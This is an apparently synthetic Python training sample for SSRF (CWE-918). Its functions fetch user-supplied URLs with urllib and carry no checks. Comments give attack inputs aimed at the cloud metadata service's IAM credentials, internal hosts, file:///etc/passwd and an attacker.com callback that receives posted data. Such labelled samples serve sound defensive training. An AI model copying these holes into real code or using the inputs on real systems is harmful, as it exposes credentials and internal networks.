# VULNERABLE: SSRF via urllib - Training Sample
# CWE-918: Server-Side Request Forgery (SSRF)
# Severity: HIGH
# Description: urllib.request fetches user-controlled URLs, enabling internal network access

import urllib.request
import urllib.parse
import urllib.error


def fetch_page(url):
    """VULNERABLE: urllib.urlopen with user-supplied URL."""
    # VULN: url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    with urllib.request.urlopen(url) as response:
        return response.read().decode()


def resolve_shortlink(short_url):
    """VULNERABLE: Follows redirects — attacker can redirect to internal service."""
    # VULN: short_url redirects to http://internal-db:5432/
    req = urllib.request.Request(short_url)
    with urllib.request.urlopen(req) as resp:
        return resp.geturl(), resp.read()


def load_remote_schema(schema_url):
    """VULNERABLE: JSON schema loaded from remote URL — targets internal endpoints."""
    # VULN: schema_url = "http://10.0.0.5:8080/internal-api/schema"
    with urllib.request.urlopen(schema_url) as f:
        import json
        return json.load(f)


def download_file(remote_url, local_path):
    """VULNERABLE: urllib.urlretrieve with user-controlled URL and destination."""
    # VULN: remote_url = "http://169.254.169.254/latest/user-data"
    urllib.request.urlretrieve(remote_url, local_path)


def proxy_request(target, headers: dict):
    """VULNERABLE: Proxies request with user-controlled headers to attacker URL."""
    req = urllib.request.Request(target)
    for k, v in headers.items():
        # VULN: headers can include Host: internal-host to bypass basic checks
        req.add_header(k, v)
    with urllib.request.urlopen(req) as resp:
        return resp.read()


def image_resize_from_url(image_url):
    """VULNERABLE: Image processor fetches from user URL — SSRF via file protocol."""
    # VULN: image_url = "file:///etc/passwd" (urllib supports file://)
    with urllib.request.urlopen(image_url) as f:
        raw = f.read()
    # (PIL resize would happen here)
    return raw


def build_and_fetch(host, path, params: dict):
    """VULNERABLE: Constructs URL from parts — each part is user-controlled."""
    # VULN: host = "169.254.169.254", path = "/latest/meta-data/"
    query = urllib.parse.urlencode(params)
    url = f"http://{host}/{path}?{query}"
    with urllib.request.urlopen(url) as resp:
        return resp.read().decode()


def opaque_fetch(encoded_url):
    """VULNERABLE: Base64-encoded URL decoded then fetched — obscures SSRF."""
    import base64
    # VULN: attacker encodes internal URL in base64 to bypass naive URL checks
    url = base64.b64decode(encoded_url).decode()
    with urllib.request.urlopen(url) as resp:
        return resp.read()


def report_callback(callback_url, data):
    """VULNERABLE: POSTs result data to attacker-controlled callback URL."""
    # VULN: callback_url = "http://attacker.com/collect"
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(callback_url, data=encoded, method="POST")
    with urllib.request.urlopen(req) as resp:
        return resp.status